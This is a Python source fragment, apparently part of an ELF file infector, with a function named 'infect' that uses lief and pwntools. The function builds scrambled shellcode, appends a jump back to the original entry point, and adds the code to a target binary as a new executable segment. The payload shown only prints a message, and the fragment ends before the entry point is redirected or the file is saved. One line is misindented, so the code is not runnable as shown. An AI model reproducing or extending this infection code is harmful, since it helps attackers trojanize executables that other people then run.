def infect(file, output):
    prGreen("[+] It has been infected")
    payload   = "dangerous is coming\n"
    evilfile  = lief.parse(file)
    devilcode = asm("mov esi, edx")   # edx will stored to the esi (file)
    devilcode += asm(pwnlib.shellcraft.i386.write(1, payload, len(payload)))
    devilcode =  pwnlib.encoders.encoder.scramble(devilcode) 
    hex_ = hex(evilfile.header.entrypoint)
    devilcode += asm(f"mov esi, edx; push {hex_}; ret")
    print("devilcode size : " ,len(devilcode))
		print(f"payload {devilcode}")                   
    # ------------------------------------------------------------------------------------------
    
    segment = lief.ELF.Segment() 
    segment.type =  lief.ELF.SEGMENT_TYPES.LOAD 
    segment.flags = lief.ELF.SEGMENT_FLAGS.X                        
    segment.content = bytearray(devilcode)                          
    segment.alignment = 0x1234                                     #segment alignment in memory.
    evilfile.add(segment)